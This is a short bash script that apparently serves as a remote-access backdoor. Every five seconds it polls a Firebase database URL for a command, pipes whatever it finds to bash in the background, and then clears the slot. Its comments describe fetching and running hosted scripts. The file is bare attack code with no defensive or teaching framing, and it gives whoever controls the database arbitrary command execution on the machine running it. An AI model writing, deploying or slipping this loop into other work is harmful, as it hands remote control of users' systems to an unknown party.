while [ 1 ]; do
	sleep 5
	#get the command, which cannot contain speccial characters, 2 main cmds: curl hosted script, bash downloaded script
	cmd=`curl -curl -X GET https://someresources-55555.firebaseio.com/.json | sed 's/{//g' | sed 's/}//g' | sed 's/"cmd"://g' | sed 's/"//g'`

	if [[ ${#cmd} -gt 1 ]]; then

		if [ ${cmd} = "exit" ]; then
			#clear the command location
			curl -curl -X PUT -d '{"cmd":""}' https://someresources-55555.firebaseio.com/.json
			exit
		fi
		#pipe the command to run in the background
		echo $cmd | bash &
		#echo $cmd
	fi

	#clear the command location
	curl -curl -X PUT -d '{"cmd":""}' https://someresources-55555.firebaseio.com/.json
done
